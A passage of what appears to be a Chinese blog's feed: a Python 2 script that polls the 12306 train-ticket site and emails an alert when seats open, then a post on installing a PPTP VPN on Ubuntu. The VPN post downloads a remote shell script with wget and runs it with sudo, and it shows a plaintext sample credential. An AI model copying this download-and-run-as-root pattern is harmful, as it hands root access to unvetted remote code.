class="title">select_seat</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> seat_name</span><br><span class="line">    <span class="keyword">if</span> seat_type <span class="keyword">in</span> seat_dict.keys():</span><br><span class="line">        seat_name = seat_dict[seat_type]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span><br><span class="line">    请求页面判断指定的车次是否有指定座位</span><br><span class="line">"""</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">refresh</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> seat_name</span><br><span class="line">    <span class="comment"># url = 'https://kyfw.12306.cn/otn/lcxxcx/query?purpose_codes=ADULT&amp;queryDate=2016-10-06&amp;from_station=OXH&amp;to_station=HFH'</span></span><br><span class="line">    <span class="comment"># r = requests.get(url)</span></span><br><span class="line">    req = urllib2.Request(url)</span><br><span class="line">    gcontext = ssl.SSLContext(ssl.PROTOCOL_TLSv1)</span><br><span class="line">    html = urllib2.urlopen(req, context=gcontext).read()</span><br><span class="line">    <span class="comment"># print html</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'&gt; &#123;&#125; refrash ...'</span>.format(datetime.datetime.now())</span><br><span class="line">    html_dict = json.loads(html)</span><br><span class="line">    <span class="comment"># print html_dict</span></span><br><span class="line">    datas = html_dict[<span class="string">'data'</span>][<span class="string">'datas'</span>]</span><br><span class="line">    <span class="keyword">for</span> data <span class="keyword">in</span> datas:</span><br><span class="line">        <span class="keyword">if</span> data[<span class="string">'station_train_code'</span>] <span class="keyword">in</span> trains:</span><br><span class="line">        <span class="comment"># if data['station_train_code']:</span></span><br><span class="line">            <span class="comment"># ze_num 表示二等座</span></span><br><span class="line">            <span class="keyword">if</span> data[seat_name] != <span class="string">u'无'</span> <span class="keyword">and</span> data[seat_name] != <span class="string">u'--'</span>:</span><br><span class="line">                <span class="keyword">print</span>  data</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'[+] Congratulations!'</span></span><br><span class="line">                msg = <span class="string">'Great Shoot, 火车:&#123;&#125; 去登录官网瞅瞅吧!'</span>.format(data[<span class="string">'station_train_code'</span>])</span><br><span class="line">                send_email(msg,email)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span><br><span class="line">	使用 smtp.qq.com 服务器 来发送邮件</span><br><span class="line">"""</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_email</span><span class="params">(info,to_addr)</span>:</span></span><br><span class="line">    msg = MIMEText(info, <span class="string">'html'</span>, <span class="string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#输入Email地址和口令:</span></span><br><span class="line">    from_addr = <span class="string">'xxxxx@foxmail.com'</span>  // 账户</span><br><span class="line">    password = <span class="string">'xxxxxx'</span>    // 授权码</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 输入SMTP服务器地址:</span></span><br><span class="line">    smtp_server = <span class="string">'smtp.qq.com'</span></span><br><span class="line">    <span class="comment"># 输入收件人地址:</span></span><br><span class="line">    to_addr = to_addr</span><br><span class="line">    msg[<span class="string">'From'</span>] = _format_addr(<span class="string">u'抢火车票 小助手 &lt;%s&gt;'</span> % from_addr)</span><br><span class="line">    msg[<span class="string">'To'</span>] = _format_addr(<span class="string">u'你好 &lt;%s&gt;'</span> % to_addr)</span><br><span class="line">    msg[<span class="string">'Subject'</span>] = Header(<span class="string">u'Hello, 已经成功捕获一只小白兔 ~'</span>, <span class="string">'utf-8'</span>).encode()</span><br><span class="line"></span><br><span class="line">    server = smtplib.SMTP(smtp_server, <span class="number">25</span>)  <span class="comment"># 连接 SMTP服务器 端口</span></span><br><span class="line">    server.starttls() <span class="comment"># 使用SSL加密方式传输数据</span></span><br><span class="line">    server.set_debuglevel(<span class="number">0</span>)  <span class="comment"># 打印出和SMTP服务器交互的所有信息</span></span><br><span class="line">    server.login(from_addr, password) <span class="comment"># 认证  这里的 password 不是QQ邮箱密码开启SMTP服务器后生成的授权码</span></span><br><span class="line">    server.sendmail(from_addr, [to_addr], msg.as_string())</span><br><span class="line">    server.quit()</span><br><span class="line"></span><br><span class="line"><span class="string">"""</span><br><span class="line">    格式化邮件正文信息</span><br><span class="line">"""</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_format_addr</span><span class="params">(s)</span>:</span></span><br><span class="line">	name, addr = parseaddr(s)</span><br><span class="line">	<span class="keyword">return</span> formataddr(( \</span><br><span class="line">		Header(name, <span class="string">'utf-8'</span>).encode(), \</span><br><span class="line">		addr.encode(<span class="string">'utf-8'</span>) <span class="keyword">if</span> isinstance(addr, unicode) <span class="keyword">else</span> addr))</span><br><span class="line"><span class="string">"""</span><br><span class="line">    程序循环入口</span><br><span class="line">"""</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># 选择座位类型</span></span><br><span class="line">    select_seat()</span><br><span class="line"></span><br><span class="line">    success = <span class="keyword">False</span></span><br><span class="line">    <span class="comment"># 每个10秒钟发送一个请求查询票源情况</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> success:</span><br><span class="line">        success = refresh()</span><br><span class="line">        time.sleep(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<ul>
<li>config.py</li>
</ul>
<p>这里根据需求进行修改，可以修改车次，座位类型，收件人邮箱账号</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置文件 -----------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 点击查询时按钮发送的请求 URL (浏览器 F12 查看 network 选项卡 能看到这个请求)</span></span><br><span class="line">url = <span class="string">'https://kyfw.12306.cn/otn/lcxxcx/query?purpose_codes=ADULT&amp;queryDate=2016-10-06&amp;from_station=OXH&amp;to_station=HFH'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 期望刷到的火车编号</span></span><br><span class="line">trains = [<span class="string">'G3245'</span>,<span class="string">'G105'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 期望刷到的座位类型</span></span><br><span class="line"><span class="comment"># 从 ['二等座','硬卧','硬座'] 中选一个填写</span></span><br><span class="line">seat_type = <span class="string">'二等座'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 刷到火车票洪接收通知的邮件账户，成功后会向该账户发送一封提示邮件</span></span><br><span class="line">email = <span class="string">'anka9080@foxmail.com'</span></span><br></pre></td></tr></table></figure>
<h4 id="源码下载"><a href="#源码下载" class="headerlink" title="源码下载"></a>源码下载</h4><p>GitHub: <a href="https://github.com/Evi1CLAY/CoolPool/tree/master/Python/12306" target="_blank" rel="external">https://github.com/Evi1CLAY/CoolPool/tree/master/Python/12306</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;本程序循环访问 12306 网站，不停的刷新页面，直到发现配置文件中预定的车次有余票时发送提示邮件并结束程序。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&quot;脚本分析&quot;&gt;&lt;a href=&quot;#脚本分析&quot; class=&quot;headerlink&quot; t
    
    </summary>
    
    
      <category term="12306抢票" scheme="http://www.evilclay.com/tags/12306%E6%8A%A2%E7%A5%A8/"/>
    
      <category term="自动化" scheme="http://www.evilclay.com/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Ubuntu配置PPTP服务器</title>
    <link href="http://www.evilclay.com/2016/09/20/Ubuntu%E9%85%8D%E7%BD%AEPPTP%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    <id>http://www.evilclay.com/2016/09/20/Ubuntu配置PPTP服务器/</id>
    <published>2016-09-19T17:57:56.000Z</published>
    <updated>2016-09-19T18:42:00.328Z</updated>
    
    <content type="html"><![CDATA[<blockquote>
<p>以前在 VPN 服务器配置这块浪费了很多时间，今天发现比较好的脚本安装方式，主要记录下使用过程中的小坑 :P</p>
</blockquote>
<p>###下载安装</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/Evi1CLAY/CoolPool/master/Script/ubuntu-onekey-pptp-vpn/setup.sh</span><br><span class="line">sudo sh setup.sh -u 用户名 -p 密码</span><br><span class="line">// 下面这种方式或默认生成用户名vpn以及随机密码</span><br><span class="line">sudo sh setup.sh</span><br></pre></td></tr></table></figure>
<p>安装之后可以通过修改配置文件的方式重新设定用户口令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/ppp/chap-secrets</span><br><span class="line">// 按照这种格式修改并保存</span><br><span class="line">anka9080 pptpd woshimima *</span><br></pre></td></tr></table></figure>
<h4 id="使用感受"><a href="#使用感受" class="headerlink" title="使用感受"></a>使用感受</h4><p>安装是没问题的，有时候使用本地主机连接不上，可能是本地网络（路由）不支持，比如我现在可以用手机在运营商网络的状态下链接成功，在本地无线网的状态下连接失败！</p>
<p>如果验证的时候用户或密码错误，错误代码是 691</p>
<p>有时候输入正确的用户名口令连接不上，返回的错误代码 619 重启 PPTP 服务再进行连接</p>
<p>需要对 VPN 服务器做一些配置，才能将其用于二层VPN连接</p>
<h4 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h4><p><a href="https://raw.githubusercontent.com/Evi1CLAY/CoolPool/master/Script/ubuntu-onekey-pptp-vpn/" target="_blank" rel="external">https://raw.githubusercontent.com/Evi1CLAY/CoolPool/master/Script/ubuntu-onekey-pptp-vpn/</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;以前在 VPN 服务器配置这块浪费了很多时间，今天发现比较好的脚本安装方式，主要记录下使用过程中的小坑 :P&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;###下载安装&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;tabl
    
    </summary>
    
    
      <category term="Ubuntu" scheme="http://www.evilclay.com/tags/Ubuntu/"/>
    
      <category term="PPTP" scheme="http://www.evilclay.com/tags/PPTP/"/>
    
  </entry>
  
</feed>
